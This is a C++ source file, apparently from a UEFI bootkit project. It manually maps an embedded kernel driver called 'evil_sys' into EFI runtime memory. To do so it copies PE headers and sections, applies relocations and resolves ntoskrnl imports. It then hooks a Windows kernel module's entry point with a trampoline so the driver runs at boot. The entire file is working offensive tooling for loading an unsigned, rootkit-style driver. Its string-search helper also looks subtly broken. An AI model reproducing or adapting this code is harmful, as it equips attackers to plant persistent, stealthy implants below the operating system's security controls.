#include "Mapper.hpp"
#include "TrampolineHook.hpp"
#include "driver_bytes.h"

const unsigned char HoldEntryPointInstructions[] = {
    0x4C, 0x8D, 0x05, 0xF9, 0xFF, 0xFF, 0xFF // lea r8, [rip - 7]
};

extern "C"
{
#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/DevicePathLib.h>
#include <Library/MemoryAllocationLib.h>
}

void *&Mapper::LoadEvilSys()
{
    static void *AllocAddr = nullptr;

    if (AllocAddr)
        return AllocAddr;

    auto Pct = (((NtHelper::GetNtHeader(evil_sys)->OptionalHeader.SizeOfImage + 0x1000 - 1) & ~(0x1000 - 1)) / 0x1000);

    EFI_PHYSICAL_ADDRESS PhysicalAddr;

    if (gBS->AllocatePages(AllocateAnyPages, EfiRuntimeServicesCode, Pct, &PhysicalAddr) != EFI_SUCCESS)
    {
        return AllocAddr = nullptr;
    }

    AllocAddr = (void *)PhysicalAddr;
    return AllocAddr;
}

void MapDriver(void *BaseNtoskrnl, void *&DriverEntryPoint, void *&MapperData)
{
    void *&BaseDriver = Mapper::LoadEvilSys();

    auto PeHeader = [](void *dst, void *src)
    {
        Hook::memcpy(dst, src, NtHelper::GetNtHeader(src)->OptionalHeader.SizeOfHeaders);
    };
    auto PeSections = [](void *dst, void *src)
    {
        auto Section = NtHelper::GetFirstSectionHeader(src);
        for (UINT16 i = 0; i < NtHelper::GetNtHeader(src)->FileHeader.NumberOfSections; ++i)
        {
            auto RawData = (void *)RVA_TO_VA(src, Section[i].PointerToRawData);
            auto VA = (void *)RVA_TO_VA(dst, Section[i].VirtualAddress);
            auto Size = MAX(Section[i].SizeOfRawData, Section[i].Misc.VirtualSize);
            Hook::memcpy(VA, RawData, Size);
        }
    };
    auto PeRelocation = [](void *dst, void *src)
    {
        auto Delta = (UINT64)dst - NtHelper::GetNtHeader(src)->OptionalHeader.ImageBase;
        auto *Relocation = &(NtHelper::GetNtHeader(src)->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_BASERELOC]);
        auto BaseReloc = (void *)RVA_TO_VA(dst, Relocation->VirtualAddress);

        UINT32 RelocSizeCounter = 0;
        while (RelocSizeCounter < Relocation->Size)
        {
            auto RelocBlock = (PBASE_RELOCATION_BLOCK)((UINT64)BaseReloc + RelocSizeCounter);
            RelocSizeCounter += sizeof(BASE_RELOCATION_BLOCK);

            auto RelocCount = (RelocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            auto RelocEntry = (PBASE_RELOCATION_ENTRY)((UINT64)BaseReloc + RelocSizeCounter);
            for (UINT32 EntryCounter = 0; EntryCounter < RelocCount; ++EntryCounter)
            {
                RelocSizeCounter += sizeof(BASE_RELOCATION_ENTRY);
                if (RelocEntry[EntryCounter].Type == IMAGE_REL_BASED_ABSOLUTE)
                {
                    continue;
                }
                else if (RelocEntry[EntryCounter].Type == IMAGE_REL_BASED_DIR64)
                {
                    auto *Patch = (UINT64 *)RVA_TO_VA(dst, RelocBlock->PageAddress + RelocEntry[EntryCounter].Offset);
                    *Patch += Delta;
                }
            }
        }
    };

    auto strstr = [](const char *str1, const char *str2) -> char *
    {
        unsigned int i, j, k;
        for (i = j = k = 0; str2[j] != '\0'; i++)
        {
            if (str1[i] == '\0')
                return (char*)'\0';
            for (j = 0, k = i; str2[j] != '\0' && str1[i + j] == str2[j]; j++)
                ;
        }
        return (char *)&str1[k];
    };
    auto strCmp = [](const char *string1, const char *string2) -> int
    {
        for (int i = 0;; i++)
        {
            if (string1[i] != string2[i])
            {
                return string1[i] < string2[i] ? -1 : 1;
            }

            if (string1[i] == '\0')
            {
                return 0;
            }
        }
    };

    auto GetExport = [&strstr, &strCmp](void *Base, const char *ExportName, bool isStr) -> void *
    {
        auto ExportRva = NtHelper::GetNtHeader(Base)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        auto Exports = (PIMAGE_EXPORT_DIRECTORY)RVA_TO_VA(Base, ExportRva);
        auto NameRva = (ULONG *)RVA_TO_VA(Base, Exports->AddressOfNames);
        for (ULONG i = 0; i < Exports->NumberOfNames; ++i)
        {
            auto Func = (char *)RVA_TO_VA(Base, NameRva[i]);
            if (isStr)
            {
                if (strstr(Func, ExportName))
                {
                    auto FuncRva = (ULONG *)RVA_TO_VA(Base, Exports->AddressOfFunctions);
                    auto OrdinalRva = (WORD *)RVA_TO_VA(Base, Exports->AddressOfNameOrdinals);

                    return (void *)RVA_TO_VA(Base, FuncRva[OrdinalRva[i]]);
                }
            }
            else
            {
                if (strCmp(Func, ExportName) == 0)
                {
                    auto FuncRva = (ULONG *)RVA_TO_VA(Base, Exports->AddressOfFunctions);
                    auto OrdinalRva = (WORD *)RVA_TO_VA(Base, Exports->AddressOfNameOrdinals);

                    return (void *)RVA_TO_VA(Base, FuncRva[OrdinalRva[i]]);
                }
            }
        }
        return nullptr;
    };
    auto PeIat = [&strCmp, &GetExport](void *dst, void *src, void *ntoskrnl)
    {
        auto *Imports = &NtHelper::GetNtHeader(src)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        auto *ImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)RVA_TO_VA(dst, Imports->VirtualAddress);

        while (ImportDescriptor->Name != 0)
        {
            auto LibName = (char *)RVA_TO_VA(dst, ImportDescriptor->Name);
            if (strCmp(LibName, "ntoskrnl.exe") != 0)
                break;

            auto Thunk = (PIMAGE_THUNK_DATA64)RVA_TO_VA(dst, ImportDescriptor->FirstThunk);
            while (Thunk->u1.AddressOfData != 0)
            {
                auto FuncName = (PIMAGE_IMPORT_BY_NAME)RVA_TO_VA(dst, Thunk->u1.AddressOfData);
                auto Func = GetExport(ntoskrnl, FuncName->Name, false);
                Thunk->u1.Function = (UINT64)Func;
                Thunk++;
            }
            ImportDescriptor++;
        }
    };

    PeHeader(BaseDriver, (void *)&evil_sys[0]);
    PeSections(BaseDriver, (void *)&evil_sys[0]);
    PeRelocation(BaseDriver, (void *)&evil_sys[0]);
    PeIat(BaseDriver, (void *)&evil_sys[0], BaseNtoskrnl);

    MapperData = GetExport(BaseDriver,"MapperData",true);
    DriverEntryPoint = (void*)RVA_TO_VA(BaseDriver, NtHelper::GetNtHeader((void*)&evil_sys[0])->OptionalHeader.AddressOfEntryPoint);
}

void Mapper::MapEvilSys(PKLDR_DATA_TABLE_ENTRY Ntoskrnl, PKLDR_DATA_TABLE_ENTRY TargetModule)
{
    void *DriverEntryPoint = nullptr; // entry point of evil.sys
    void *MapperData = nullptr;       // reserved 7 + 14 = 21 bytes

    MapDriver(Ntoskrnl->ImageBase, DriverEntryPoint, MapperData);
    Hook::memcpy(MapperData, TargetModule->EntryPoint, 7 + 14); //backuping bytes...

    Hook::memcpy(TargetModule->EntryPoint, (void *)HoldEntryPointInstructions, sizeof(HoldEntryPointInstructions)); //inserting ret addr to call
    Hook::TrampolineHookX64((void*)((UINT64)TargetModule->EntryPoint + sizeof(HoldEntryPointInstructions)), DriverEntryPoint, nullptr); //jmp hook
}